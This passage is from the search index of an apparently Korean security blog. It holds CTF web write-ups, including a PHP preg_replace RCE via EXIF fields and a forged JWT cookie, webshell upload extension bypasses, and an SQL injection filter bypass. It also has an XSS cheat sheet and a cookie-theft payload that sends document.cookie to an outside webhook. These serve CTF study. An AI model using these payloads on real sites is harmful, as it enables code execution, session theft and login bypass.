&#123;$Model&#125;&lt;br&gt;&quot;; &#125; &#125; if($body[&#39;admin&#39;]==true)&#123; $edit = explode(&#39;.&#39;,$_COOKIE[&#39;edit&#39;]); preg_replace($$edit[0],$$edit[1],$$edit[2]); &#125; ?&gt; 이번에도 코드가 좀 길다, 한번 분석해보자. if($body[&#39;admin&#39;]==true)&#123; $edit = explode(&#39;.&#39;,$_COOKIE[&#39;edit&#39;]); preg_replace($$edit[0],$$edit[1],$$edit[2]); &#125; 이 부분에 보면 쿠키 값의 admin이 true를 가질 때, edit의 쿠키를 가지고 preg_replace 함수의 인자로 사용한다. 처음엔 좀 생각 했는데, 검색 하다가 우연히 preg_replace 함수에 대해 RCE 문서를 찾을 수 있었다. 그렇다 이 문제도 동일한 취약점을 사용하고 있다. $Date = $infor[&#39;DateTimeOriginal&#39;]; $Model = $infor[&#39;Model&#39;]; $Make = $infor[&#39;Make&#39;]; $size = round($infor[&#39;FileSize&#39;]/1024,1); 이 부분에서 업로드 하는 jpg 파일의 사진 정보 값을 담고 출력 해주니, $model, $make 에 공격 페이로드를 넣고 admin 쿠키를 조작 해 preg_replace 함수로 흘러가게 해주면 된다. 세션 조작은 문제에서 만들어주는 형태와 동일하게 새 jwt 세션을 만들어서 바꿔주면 된다. (아래 참고) &lt;?php require_once &quot;jwt.php&quot;; $jwt = new jwt(); $token = $jwt-&gt;hashing(array( ‘admin’=&gt;’true’, ‘iat’=&gt;time() )); var_dump($token); ?&gt; Model=/a/e &amp; Make=eval(base64_decode(‘c3lzdGVtKCRfR0VUWydjbWQnXSk7’));?cmd=ls &amp; ?cmd=/flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"ROP & SSE Instruction","slug":"rop-instruction-200210","date":"2020-02-09T15:00:00.000Z","updated":"2021-01-17T09:00:21.607Z","comments":true,"path":"2020/02/10/rop-instruction-200210/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/10/rop-instruction-200210/","excerpt":"","text":"Linkhttps://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"}]},{"title":"DIMICTF 2019 Write up","slug":"dimictf-200206","date":"2020-02-05T15:00:00.000Z","updated":"2021-01-17T08:59:30.686Z","comments":true,"path":"2020/02/06/dimictf-200206/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/06/dimictf-200206/","excerpt":"","text":"1. web(5shared)&lt;?php require_once &#39;lib.php&#39;; session_start(); $session = md5(session_id()); $uploaddir = __DIR__ . &quot;/~uploads/&#123;$session&#125;/&quot;; createDirectory(__DIR__ . &quot;/~uploads/&quot;); createDirectory($uploaddir); //print_r($_FILES[&#39;file&#39;]); $file = $_FILES[&#39;file&#39;]; $uploadfile = $uploaddir . $file[&#39;name&#39;]; // sanity check $extension = explode(&#39;.&#39;, $file[&#39;name&#39;])[1]; if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;))) &#123; $message = &quot;&lt;script&gt;alert(&#39;jpg, gif, png 확장자만 업로드할 수 있습니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; // the real sanity check $real_extension = array_pop(explode(&#39;.&#39;, $file[&#39;name&#39;])); if (preg_match(&quot;/php/i&quot;, $file[&#39;name&#39;])) &#123; $message = &quot;&lt;script&gt;alert(&#39;파일 이름에 php가 들어가면 안됩니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; if ($file[&#39;size&#39;] &gt; 4096) &#123; $message = &quot;&lt;script&gt;alert(&#39;최대 4mb까지 업로드할 수 있습니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; if (move_uploaded_file($file[&#39;tmp_name&#39;], $uploadfile)) &#123; $message = &quot;&lt;script&gt;alert(&#39;성공적으로 파일이 업로드되었습니다.&#39;); location.href = &#39;/&#39;; &lt;/script&gt;&quot;; echo $message; &#125; else &#123; $message = &quot;&lt;script&gt;alert(&#39;업로드 에러&#39;); history.back(); &lt;/script&gt;&quot;; echo $message; &#125; 코드가 좀 긴편인데 주요 부분들만 한번 확인 해보자, // sanity check $extension = explode(&#39;.&#39;, $file[&#39;name&#39;])[1]; if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;))) &#123; $message = &quot;&lt;script&gt;alert(&#39;jpg, gif, png 확장자만 업로드할 수 있습니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; // the real sanity check $real_extension = array_pop(explode(&#39;.&#39;, $file[&#39;name&#39;])); if (preg_match(&quot;/php/i&quot;, $file[&#39;name&#39;])) &#123; $message = &quot;&lt;script&gt;alert(&#39;파일 이름에 php가 들어가면 안됩니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; 웹쉘 업로드 문제이기 때문에 사실상 이 부분만 우회할 수 있다면 금방 풀 수 있다. sanity check 부분에 보면 argv[1] 로 오는 문자를 검사하는데,jpg, gif, png 만 허용시켜 둔 상황이다. 그런데 php에선 또 이상한 문제점이 우리를 반겨준다. 저렇게 검사할 경우에 다음과 같은 트릭을 사용할 수 있다. test.jpg test.jpg.phpjpg 뒤에 확장자를 하나 더 붙여서 실행 파일로 만들어 주면 확장자 검사를 피할 수 있다.근데 아래 real sanity check를 보면 php는 또 불가능 하기 때문에 php 대체 확장자를 써서 우회해주자. (phtml, php5 등) upload) test.jpg.phtml위와 같이 파일 명을 바꾸고, 웹 쉘을 업로드 시키면 된다. 2. (web) simple xss문제에 들어가면 게시판이 있는데 그냥 글쓰기 부분에서 xss payload 넣고,봇의 쿠키를 탈취하면 된다. location.href=&#39;https://webhook.site/~&#39;+document.cookie; 3. (web) simple sqli&lt;?php //error_reporting(E_ALL); //ini_set(&quot;display_errors&quot;, 1); require &#39;lib.php&#39;; if (isset($_GET[&#39;view-source&#39;]))&#123; highlight_file(__FILE__); exit; &#125; $id = $_POST[&#39;id&#39;]; $pw = $_POST[&#39;pw&#39;]; //var_dump($conn); if (preg_match(&quot;/information|admin|or|\\=| |\\#|\\&#39;|_|where/i&quot;, $id . $pw)) die(&quot;No Hack ~_~&quot;); if (isset($id, $pw)) &#123; $query = &quot;SELECT * FROM `users` WHERE `id` = trim(&#39;&#123;$id&#125;&#39;) AND `pw` = trim(&#39;&#123;$pw&#125;&#39;)&quot;; $result = mysqli_fetch_array(mysqli_query($conn, $query)); if ($result[&#39;id&#39;] === &#39;admin&#39;) echo &quot;&lt;h1&gt;&#123;$flag&#125;&lt;/h1&gt;&quot;; if ($result[&#39;id&#39;]) &#123; $message = &quot;&#123;$result[&#39;id&#39;]&#125;님 안녕하세요!&quot;; &#125; else &#123; $message = &quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;; &#125; &#125; ?&gt; 페이지 로그인 코드는 다음과 같다.$id, $pw 에 입력되는 값에서 information, admin, or 등 여러가지를 필터링 한다. 이 정규식 검증 부분들은 tab, like 문자를 통해서 쿼리문을 완성할 수 있다. id=\\&amp;pw=)|| id like &quot;ad&quot; &quot;min&quot;-- -","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"CTF Web Challenge(Dockerfile)","slug":"dockerfile-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T10:11:28.888Z","comments":true,"path":"2020/02/05/dockerfile-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/dockerfile-200205/","excerpt":"","text":"간단한 버전이라서 쓰는 사람에 맞게 적절히 수정하면 된다. FROM ubuntu:18.04 ENV DEBIAN_FRONTEND=noninteractive ENV TERM=linux RUN apt-get update -y RUN apt-get install apache2 -y RUN apt-get install libapache2-mod-php -y RUN apt-get install php -y RUN apt-get install vim -y COPY ./files /var/www/html RUN rm -rf /var/www/html/index.html EXPOSE 포트번호 CMD [&quot;/usr/sbin/apache2ctl&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;]","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/tags/Docker/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://blog.jhyeon.dev/tags/Dockerfile/"}]},{"title":"libc database search(bluekat)","slug":"pwnbluekat-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T08:08:00.797Z","comments":true,"path":"2020/02/05/pwnbluekat-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/pwnbluekat-200205/","excerpt":"","text":"예전에 포너블 공부할 때 rop 문제에서 오프셋 기반으로립씨 버전 하나하나 찾으려니 솔직히 너무 귀찮았다.. 그래서 찾아보다가 libc bluekat 이라는 사이트를 찾았는데,함수 오프셋을 통해서 일치하는 libc 버전을 간단하게 찾아 주었다! 포너블 하신다면 자주 이용해먹으면 좋을 것 같다. [https://libc.blukat.me](libc-bluekat homepage)","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"}]},{"title":"xss cheatsheet 2020","slug":"xsscheatsheet-200205","date":"2020-02-04T15:00:00.000Z","updated":"2021-01-17T09:00:58.633Z","comments":true,"path":"2020/02/05/xsscheatsheet-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/xsscheatsheet-200205/","excerpt":"","text":"&lt;script&gt;alert(1)&lt;/script&gt; &lt;Script&gt;alert(1)&lt;/Script&gt; &lt;svg onload=alert(1)&gt; &lt;img src=&quot;#&quot; onerror=alert(1)&gt; &lt;script src=&quot;hacker.com/hack.js&quot;&gt;&lt;/script&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;cilck me&lt;/a&gt; &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;/embed&gt; &lt;body onload=&quot;alert(1);&quot;&gt; &lt;body onunload=&quot;alert(1);&quot;&gt; &quot;&gt;&lt;svg onload=alert(1)&gt; &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; &lt;/style&gt;&lt;svg onload=alert(1)&gt; data:text/html,&lt;svg onload=alert(1)&gt; &lt;/script&gt;&lt;svg onload=alert(1)&gt; */alert(1)&lt;/script&gt;&lt;script&gt;/* constructor.constructor(&#39;alert(/xss/)&#39;)()&#125;&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"CheatSheet","slug":"CheatSheet","permalink":"https://blog.jhyeon.dev/tags/CheatSheet/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"},{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"},{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"},{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"},{"name":"Development","slug":"Development","permalink":"https://blog.jhyeon.dev/categories/Development/"},{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"},{"name":"Research","slug":"Research","permalink":"https://blog.jhyeon.dev/categories/Research/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"해킹캠프","slug":"해킹캠프","permalink":"https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%BA%A0%ED%94%84/"},{"name":"보안","slug":"보안","permalink":"https://blog.jhyeon.dev/tags/%EB%B3%B4%EC%95%88/"},{"name":"해킹","slug":"해킹","permalink":"https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9/"},{"name":"버그바운티","slug":"버그바운티","permalink":"https://blog.jhyeon.dev/tags/%EB%B2%84%EA%B7%B8%EB%B0%94%EC%9A%B4%ED%8B%B0/"},{"name":"HackingCamp","slug":"HackingCamp","permalink":"https://blog.jhyeon.dev/tags/HackingCamp/"},{"name":"POC Security","slug":"POC-Security","permalink":"https://blog.jhyeon.dev/tags/POC-Security/"},{"name":"DEMON","slug":"DEMON","permalink":"https://blog.jhyeon.dev/tags/DEMON/"},{"name":"SISS","slug":"SISS","permalink":"https://blog.jhyeon.dev/tags/SISS/"},{"name":"IOS","slug":"IOS","permalink":"https://blog.jhyeon.dev/tags/IOS/"},{"name":"모의해킹","slug":"모의해킹","permalink":"https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/"},{"name":"프록시","slug":"프록시","permalink":"https://blog.jhyeon.dev/tags/%ED%94%84%EB%A1%9D%EC%8B%9C/"},{"name":"Burp Suite","slug":"Burp-Suite","permalink":"https://blog.jhyeon.dev/tags/Burp-Suite/"},{"name":"KOSPO","slug":"KOSPO","permalink":"https://blog.jhyeon.dev/tags/KOSPO/"},{"name":"한국남부발전","slug":"한국남부발전","permalink":"https://blog.jhyeon.dev/tags/%ED%95%9C%EA%B5%AD%EB%82%A8%EB%B6%80%EB%B0%9C%EC%A0%84/"},{"name":"메모리 보호기법","slug":"메모리-보호기법","permalink":"https://blog.jhyeon.dev/tags/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95/"},{"name":"Memory Mitigation","slug":"Memory-Mitigation","permalink":"https://blog.jhyeon.dev/tags/Memory-Mitigation/"},{"name":"Canary","slug":"Canary","permalink":"https://blog.jhyeon.dev/tags/Canary/"},{"name":"WebHacking.kr","slug":"WebHacking-kr","permalink":"https://blog.jhyeon.dev/tags/WebHacking-kr/"},{"name":"WebHacking","slug":"WebHacking","permalink":"https://blog.jhyeon.dev/tags/WebHacking/"},{"name":"Write up","slug":"Write-up","permalink":"https://blog.jhyeon.dev/tags/Write-up/"},{"name":"CSP","slug":"CSP","permalink":"https://blog.jhyeon.dev/tags/CSP/"},{"name":"NXBIT","slug":"NXBIT","permalink":"https://blog.jhyeon.dev/tags/NXBIT/"},{"name":"DEP","slug":"DEP","permalink":"https://blog.jhyeon.dev/tags/DEP/"},{"name":"Web Hacking","slug":"Web-Hacking","permalink":"https://blog.jhyeon.dev/tags/Web-Hacking/"},{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/tags/Wargame/"},{"name":"webhacking.kr","slug":"webhacking-kr","permalink":"https://blog.jhyeon.dev/tags/webhacking-kr/"},{"name":"ASLR","slug":"ASLR","permalink":"https://blog.jhyeon.dev/tags/ASLR/"},{"name":"RELRO","slug":"RELRO","permalink":"https://blog.jhyeon.dev/tags/RELRO/"},{"name":"KISA","slug":"KISA","permalink":"https://blog.jhyeon.dev/tags/KISA/"},{"name":"삼성SDS","slug":"삼성SDS","permalink":"https://blog.jhyeon.dev/tags/%EC%82%BC%EC%84%B1SDS/"},{"name":"버그 바운티","slug":"버그-바운티","permalink":"https://blog.jhyeon.dev/tags/%EB%B2%84%EA%B7%B8-%EB%B0%94%EC%9A%B4%ED%8B%B0/"},{"name":"Bug Bounty","slug":"Bug-Bounty","permalink":"https://blog.jhyeon.dev/tags/Bug-Bounty/"},{"name":"취약점 제보","slug":"취약점-제보","permalink":"https://blog.jhyeon.dev/tags/%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%9C%EB%B3%B4/"},{"name":"해킹존","slug":"해킹존","permalink":"https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%A1%B4/"},{"name":"웹 모의해킹","slug":"웹-모의해킹","permalink":"https://blog.jhyeon.dev/tags/%EC%9B%B9-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/"},{"name":"웹 해킹","slug":"웹-해킹","permalink":"https://blog.jhyeon.dev/tags/%EC%9B%B9-%ED%95%B4%ED%82%B9/"},{"name":"Fiddler","slug":"Fiddler","permalink":"https://blog.jhyeon.dev/tags/Fiddler/"},{"name":"Proxy","slug":"Proxy","permalink":"https://blog.jhyeon.dev/tags/Proxy/"},{"name":"Proxy Bypass","slug":"Proxy-Bypass","permalink":"https://blog.jhyeon.dev/tags/Proxy-Bypass/"},{"name":"Flask","slug":"Flask","permalink":"https://blog.jhyeon.dev/tags/Flask/"},{"name":"Apache2","slug":"Apache2","permalink":"https://blog.jhyeon.dev/tags/Apache2/"},{"name":"WSGI","slug":"WSGI","permalink":"https://blog.jhyeon.dev/tags/WSGI/"},{"name":"uWSGI","slug":"uWSGI","permalink":"https://blog.jhyeon.dev/tags/uWSGI/"},{"name":"한국인터넷진흥원","slug":"한국인터넷진흥원","permalink":"https://blog.jhyeon.dev/tags/%ED%95%9C%EA%B5%AD%EC%9D%B8%ED%84%B0%EB%84%B7%EC%A7%84%ED%9D%A5%EC%9B%90/"},{"name":"기술 취약점 분석","slug":"기술-취약점-분석","permalink":"https://blog.jhyeon.dev/tags/%EA%B8%B0%EC%88%A0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D/"},{"name":"기술 취약점 분석 가이드","slug":"기술-취약점-분석-가이드","permalink":"https://blog.jhyeon.dev/tags/%EA%B8%B0%EC%88%A0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EA%B0%80%EC%9D%B4%EB%93%9C/"},{"name":"주통기 취약점 가이드","slug":"주통기-취약점-가이드","permalink":"https://blog.jhyeon.dev/tags/%EC%A3%BC%ED%86%B5%EA%B8%B0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%80%EC%9D%B4%EB%93%9C/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"CTFtime","slug":"CTFtime","permalink":"https://blog.jhyeon.dev/tags/CTFtime/"},{"name":"dCTF 2021","slug":"dCTF-2021","permalink":"https://blog.jhyeon.dev/tags/dCTF-2021/"},{"name":"Python","slug":"Python","permalink":"https://blog.jhyeon.dev/tags/Python/"},{"name":"Decouple","slug":"Decouple","permalink":"https://blog.jhyeon.dev/tags/Decouple/"},{"name":"SECRET_KEY","slug":"SECRET-KEY","permalink":"https://blog.jhyeon.dev/tags/SECRET-KEY/"},{"name":"Android","slug":"Android","permalink":"https://blog.jhyeon.dev/tags/Android/"},{"name":"ADB","slug":"ADB","permalink":"https://blog.jhyeon.dev/tags/ADB/"},{"name":"SSL","slug":"SSL","permalink":"https://blog.jhyeon.dev/tags/SSL/"},{"name":"CA 인증서","slug":"CA-인증서","permalink":"https://blog.jhyeon.dev/tags/CA-%EC%9D%B8%EC%A6%9D%EC%84%9C/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"Reversing","slug":"Reversing","permalink":"https://blog.jhyeon.dev/tags/Reversing/"},{"name":"Crypto","slug":"Crypto","permalink":"https://blog.jhyeon.dev/tags/Crypto/"},{"name":"Network","slug":"Network","permalink":"https://blog.jhyeon.dev/tags/Network/"},{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/tags/Mobile/"},{"name":"SatunX","slug":"SatunX","permalink":"https://blog.jhyeon.dev/tags/SatunX/"},{"name":"HSPACE","slug":"HSPACE","permalink":"https://blog.jhyeon.dev/tags/HSPACE/"},{"name":"HSPACE CTF","slug":"HSPACE-CTF","permalink":"https://blog.jhyeon.dev/tags/HSPACE-CTF/"},{"name":"Penetration","slug":"Penetration","permalink":"https://blog.jhyeon.dev/tags/Penetration/"},{"name":"App","slug":"App","permalink":"https://blog.jhyeon.dev/tags/App/"},{"name":"Unity","slug":"Unity","permalink":"https://blog.jhyeon.dev/tags/Unity/"},{"name":"Mobile Hacking","slug":"Mobile-Hacking","permalink":"https://blog.jhyeon.dev/tags/Mobile-Hacking/"},{"name":"il2cppdumper","slug":"il2cppdumper","permalink":"https://blog.jhyeon.dev/tags/il2cppdumper/"},{"name":"OWASP","slug":"OWASP","permalink":"https://blog.jhyeon.dev/tags/OWASP/"},{"name":"Pwn","slug":"Pwn","permalink":"https://blog.jhyeon.dev/tags/Pwn/"},{"name":"Rev","slug":"Rev","permalink":"https://blog.jhyeon.dev/tags/Rev/"},{"name":"HackPackCTF 2021","slug":"HackPackCTF-2021","permalink":"https://blog.jhyeon.dev/tags/HackPackCTF-2021/"},{"name":"RITSEC 2021","slug":"RITSEC-2021","permalink":"https://blog.jhyeon.dev/tags/RITSEC-2021/"},{"name":"VirtualBox","slug":"VirtualBox","permalink":"https://blog.jhyeon.dev/tags/VirtualBox/"},{"name":"CVE","slug":"CVE","permalink":"https://blog.jhyeon.dev/tags/CVE/"},{"name":"CVSS","slug":"CVSS","permalink":"https://blog.jhyeon.dev/tags/CVSS/"},{"name":"Crpyto","slug":"Crpyto","permalink":"https://blog.jhyeon.dev/tags/Crpyto/"},{"name":"AngStormCTF 2021","slug":"AngStormCTF-2021","permalink":"https://blog.jhyeon.dev/tags/AngStormCTF-2021/"},{"name":"UMassCTF'21","slug":"UMassCTF-21","permalink":"https://blog.jhyeon.dev/tags/UMassCTF-21/"},{"name":"AWS","slug":"AWS","permalink":"https://blog.jhyeon.dev/tags/AWS/"},{"name":"EC2","slug":"EC2","permalink":"https://blog.jhyeon.dev/tags/EC2/"},{"name":"Ubuntu CLI","slug":"Ubuntu-CLI","permalink":"https://blog.jhyeon.dev/tags/Ubuntu-CLI/"},{"name":"Selenium","slug":"Selenium","permalink":"https://blog.jhyeon.dev/tags/Selenium/"},{"name":"ChromeDriver","slug":"ChromeDriver","permalink":"https://blog.jhyeon.dev/tags/ChromeDriver/"},{"name":"NodeJS","slug":"NodeJS","permalink":"https://blog.jhyeon.dev/tags/NodeJS/"},{"name":"V8 Engine","slug":"V8-Engine","permalink":"https://blog.jhyeon.dev/tags/V8-Engine/"},{"name":"VM Module","slug":"VM-Module","permalink":"https://blog.jhyeon.dev/tags/VM-Module/"},{"name":"Sandbox","slug":"Sandbox","permalink":"https://blog.jhyeon.dev/tags/Sandbox/"},{"name":"Code Execution","slug":"Code-Execution","permalink":"https://blog.jhyeon.dev/tags/Code-Execution/"},{"name":"AeroCTF2021","slug":"AeroCTF2021","permalink":"https://blog.jhyeon.dev/tags/AeroCTF2021/"},{"name":"Application","slug":"Application","permalink":"https://blog.jhyeon.dev/tags/Application/"},{"name":"Frida","slug":"Frida","permalink":"https://blog.jhyeon.dev/tags/Frida/"},{"name":"Hooking","slug":"Hooking","permalink":"https://blog.jhyeon.dev/tags/Hooking/"},{"name":"HCAMP","slug":"HCAMP","permalink":"https://blog.jhyeon.dev/tags/HCAMP/"},{"name":"HACKINGCAMP","slug":"HACKINGCAMP","permalink":"https://blog.jhyeon.dev/tags/HACKINGCAMP/"},{"name":"정보 보안","slug":"정보-보안","permalink":"https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4-%EB%B3%B4%EC%95%88/"},{"name":"OWASP-MSTG","slug":"OWASP-MSTG","permalink":"https://blog.jhyeon.dev/tags/OWASP-MSTG/"},{"name":"Study","slug":"Study","permalink":"https://blog.jhyeon.dev/tags/Study/"},{"name":"Root","slug":"Root","permalink":"https://blog.jhyeon.dev/tags/Root/"},{"name":"Nexus5X","slug":"Nexus5X","permalink":"https://blog.jhyeon.dev/tags/Nexus5X/"},{"name":"RCE","slug":"RCE","permalink":"https://blog.jhyeon.dev/tags/RCE/"},{"name":"LFI","slug":"LFI","permalink":"https://blog.jhyeon.dev/tags/LFI/"},{"name":"Pentesting","slug":"Pentesting","permalink":"https://blog.jhyeon.dev/tags/Pentesting/"},{"name":"Github","slug":"Github","permalink":"https://blog.jhyeon.dev/tags/Github/"},{"name":"Hexo","slug":"Hexo","permalink":"https://blog.jhyeon.dev/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://blog.jhyeon.dev/tags/Blog/"},{"name":"DVWA","slug":"DVWA","permalink":"https://blog.jhyeon.dev/tags/DVWA/"},{"name":"Big Sur","slug":"Big-Sur","permalink":"https://blog.jhyeon.dev/tags/Big-Sur/"},{"name":"Mac OS","slug":"Mac-OS","permalink":"https://blog.jhyeon.dev/tags/Mac-OS/"},{"name":"Backup","slug":"Backup","permalink":"https://blog.jhyeon.dev/tags/Backup/"},{"name":"정보보안","slug":"정보보안","permalink":"https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/"},{"name":"최신동향","slug":"최신동향","permalink":"https://blog.jhyeon.dev/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/"},{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/tags/Docker/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.jhyeon.dev/tags/Ubuntu/"},{"name":"Suricata","slug":"Suricata","permalink":"https://blog.jhyeon.dev/tags/Suricata/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.jhyeon.dev/tags/Linux/"},{"name":"회고","slug":"회고","permalink":"https://blog.jhyeon.dev/tags/%ED%9A%8C%EA%B3%A0/"},{"name":"System","slug":"System","permalink":"https://blog.jhyeon.dev/tags/System/"},{"name":"OS","slug":"OS","permalink":"https://blog.jhyeon.dev/tags/OS/"},{"name":"syscall","slug":"syscall","permalink":"https://blog.jhyeon.dev/tags/syscall/"},{"name":"ChristmasCTF2019","slug":"ChristmasCTF2019","permalink":"https://blog.jhyeon.dev/tags/ChristmasCTF2019/"},{"name":"BISC2020","slug":"BISC2020","permalink":"https://blog.jhyeon.dev/tags/BISC2020/"},{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"},{"name":"POX2020","slug":"POX2020","permalink":"https://blog.jhyeon.dev/tags/POX2020/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://blog.jhyeon.dev/tags/NoSQL/"},{"name":"Cassandra","slug":"Cassandra","permalink":"https://blog.jhyeon.dev/tags/Cassandra/"},{"name":"DB","slug":"DB","permalink":"https://blog.jhyeon.dev/tags/DB/"},{"name":"Primary Key","slug":"Primary-Key","permalink":"https://blog.jhyeon.dev/tags/Primary-Key/"},{"name":"Foreign Key","slug":"Foreign-Key","permalink":"https://blog.jhyeon.dev/tags/Foreign-Key/"},{"name":"iftop","slug":"iftop","permalink":"https://blog.jhyeon.dev/tags/iftop/"},{"name":"CSAWCTF 2020","slug":"CSAWCTF-2020","permalink":"https://blog.jhyeon.dev/tags/CSAWCTF-2020/"},{"name":"PicoCTF2019","slug":"PicoCTF2019","permalink":"https://blog.jhyeon.dev/tags/PicoCTF2019/"},{"name":"C++","slug":"C","permalink":"https://blog.jhyeon.dev/tags/C/"},{"name":"STL","slug":"STL","permalink":"https://blog.jhyeon.dev/tags/STL/"},{"name":"Algorithm","slug":"Algorithm","permalink":"https://blog.jhyeon.dev/tags/Algorithm/"},{"name":"선형 탐색","slug":"선형-탐색","permalink":"https://blog.jhyeon.dev/tags/%EC%84%A0%ED%98%95-%ED%83%90%EC%83%89/"},{"name":"이진 탐색","slug":"이진-탐색","permalink":"https://blog.jhyeon.dev/tags/%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89/"},{"name":"BOF","slug":"BOF","permalink":"https://blog.jhyeon.dev/tags/BOF/"},{"name":"CANVAS","slug":"CANVAS","permalink":"https://blog.jhyeon.dev/tags/CANVAS/"},{"name":"LMS","slug":"LMS","permalink":"https://blog.jhyeon.dev/tags/LMS/"},{"name":"B@ngsiri","slug":"B-ngsiri","permalink":"https://blog.jhyeon.dev/tags/B-ngsiri/"},{"name":"Python Pickle","slug":"Python-Pickle","permalink":"https://blog.jhyeon.dev/tags/Python-Pickle/"},{"name":"Vulnability","slug":"Vulnability","permalink":"https://blog.jhyeon.dev/tags/Vulnability/"},{"name":"Development","slug":"Development","permalink":"https://blog.jhyeon.dev/tags/Development/"},{"name":"Browser Auditor","slug":"Browser-Auditor","permalink":"https://blog.jhyeon.dev/tags/Browser-Auditor/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://blog.jhyeon.dev/tags/CSRF/"},{"name":"Chrome","slug":"Chrome","permalink":"https://blog.jhyeon.dev/tags/Chrome/"},{"name":"Firefox","slug":"Firefox","permalink":"https://blog.jhyeon.dev/tags/Firefox/"},{"name":"Malware","slug":"Malware","permalink":"https://blog.jhyeon.dev/tags/Malware/"},{"name":"Macro","slug":"Macro","permalink":"https://blog.jhyeon.dev/tags/Macro/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.jhyeon.dev/tags/PHP/"},{"name":"websec.fr","slug":"websec-fr","permalink":"https://blog.jhyeon.dev/tags/websec-fr/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"},{"name":"BoB","slug":"BoB","permalink":"https://blog.jhyeon.dev/tags/BoB/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://blog.jhyeon.dev/tags/Dockerfile/"},{"name":"JWT","slug":"JWT","permalink":"https://blog.jhyeon.dev/tags/JWT/"},{"name":"Mprotect","slug":"Mprotect","permalink":"https://blog.jhyeon.dev/tags/Mprotect/"},{"name":"Shellcode","slug":"Shellcod